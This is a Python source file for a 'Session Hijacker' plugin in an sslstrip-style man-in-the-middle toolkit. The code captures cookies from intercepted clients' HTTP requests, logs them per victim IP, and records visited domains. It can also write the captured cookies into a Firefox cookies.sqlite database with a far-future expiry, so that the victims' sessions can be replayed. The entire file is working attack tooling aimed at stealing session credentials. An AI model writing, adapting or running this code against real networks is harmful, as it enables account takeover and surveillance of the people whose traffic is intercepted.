#Almost all of the Firefox related code was stolen from Glenn's Firelamb.
#glenn@sensepost.com

from plugins.plugin import Plugin
from sslstrip.URLMonitor import URLMonitor
from libs.publicsuffix import PublicSuffixList
from urlparse import urlparse
import os
import sys
import time
import logging
import sqlite3
import threading

class SessionHijacker(Plugin):
	name = "Session Hijacker"
	optname = "hijack"
	desc = "Performs session hijacking attacks against clients"
	implements = ["cleanHeaders"] #["handleHeader"]
	has_opts = True

	def initialize(self, options):
		'''Called if plugin is enabled, passed the options namespace'''
		self.options = options
		self.log_clients = options.clients
		self.urlMonitor = URLMonitor.getInstance()
		self.psl = PublicSuffixList()
		self.firefox = options.firefox
		self.save_dir = "./logs"
		self.seen_hosts = {}
		self.sql_conns = {}
		self.html_header="<h2>Cookies sniffed for the following domains\n<hr>\n<br>"

		#Recent versions of Firefox use "PRAGMA journal_mode=WAL" which requires
		#SQLite version 3.7.0 or later.  You won't be able to read the database files
		#with SQLite version 3.6.23.1 or earlier.  You'll get the "file is encrypted
		#or is not a database" message.

		sqlv = sqlite3.sqlite_version.split('.')
		if (sqlv[0] <3 or sqlv[1] < 7):
			sys.exit("[-] sqlite3 version 3.7 or greater required")

		if not os.path.exists("./logs"):
			os.makedirs("./logs")

		print "[*] Session Hijacker plugin online"

	def cleanHeaders(self, request): # Client => Server
		headers = request.getAllHeaders().copy()
		client_ip = request.getClientIP()

		if 'cookie' in headers:
			message = "%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie'])
			if self.urlMonitor.isClientLogging() is True:
				self.urlMonitor.writeClientLog(request, headers, message)
			
			if self.firefox:
				url = "http://" + headers['host'] + request.getPathFromUri()
				for cookie in headers['cookie'].split(';'):
					eq = cookie.find("=")
					cname = str(cookie)[0:eq].strip()
					cvalue = str(cookie)[eq+1:].strip()
					#t = threading.Thread(name='firefoxdb', target=self.firefoxdb, args=(headers['host'], cname, cvalue, url, client_ip))
					#t.setDaemon(True)
					#t.start()
					self.firefoxdb(headers['host'], cname, cvalue, url, client_ip)
			else:
				logging.info(message)


	#def handleHeader(self, request, key, value): # Server => Client
	#	if 'set-cookie' in request.client.headers:
	#		cookie = request.client.headers['set-cookie']
	#		#host = request.client.headers['host'] #wtf????
	#		message = "%s Got server cookie: %s" % (request.client.getClientIP(), cookie)
	#		if self.urlMonitor.isClientLogging() is True:
	#			self.urlMonitor.writeClientLog(request.client, request.client.headers, message)
	#		else:
	#			logging.info(message)

	def firefoxdb(self, host, cookie_name, cookie_value, url, ip):

		session_dir=self.save_dir + "/" + ip
		cookie_file=session_dir +'/cookies.sqlite'
		cookie_file_exists = os.path.exists(cookie_file)

		if (ip not in (self.sql_conns and os.listdir("./logs"))):

			try:
				if not os.path.exists(session_dir):
	                		os.makedirs(session_dir)

				db = sqlite3.connect(cookie_file, isolation_level=None)
				self.sql_conns[ip] = db.cursor()

				if not cookie_file_exists:
					self.sql_conns[ip].execute("CREATE TABLE moz_cookies (id INTEGER PRIMARY KEY, baseDomain TEXT, name TEXT, value TEXT, host TEXT, path TEXT, expiry INTEGER, lastAccessed INTEGER, creationTime INTEGER, isSecure INTEGER, isHttpOnly INTEGER, CONSTRAINT moz_uniqueid UNIQUE (name, host, path))")
					self.sql_conns[ip].execute("CREATE INDEX moz_basedomain ON moz_cookies (baseDomain)")
			except Exception, e:
				print str(e)

		scheme = urlparse(url).scheme
		scheme = (urlparse(url).scheme)
		basedomain = self.psl.get_public_suffix(host)
		address = urlparse(url).hostname
		short_url = scheme + "://"+ address

		log = open(session_dir + '/visited.html','a')
		if (ip not in self.seen_hosts):
			self.seen_hosts[ip] = {}
			log.write(self.html_header)

		if (address not in self.seen_hosts[ip]):
			self.seen_hosts[ip][address] = 1
			log.write("\n<br>\n<a href='%s'>%s</a>" %(short_url, address))

		log.close()

		if address == basedomain:
			address = "." + address

		expire_date = 2000000000 #Year2033
		now = int(time.time()) - 600
		self.sql_conns[ip].execute('INSERT OR IGNORE INTO moz_cookies (baseDomain, name, value, host, path, expiry, lastAccessed, creationTime, isSecure, isHttpOnly) VALUES (?,?,?,?,?,?,?,?,?,?)', (basedomain,cookie_name,cookie_value,address,'/',expire_date,now,now,0,0))

	def add_options(self, options):
		options.add_argument('--firefox', dest='firefox', action='store_true', default=False, help='Create a firefox profile with captured cookies')
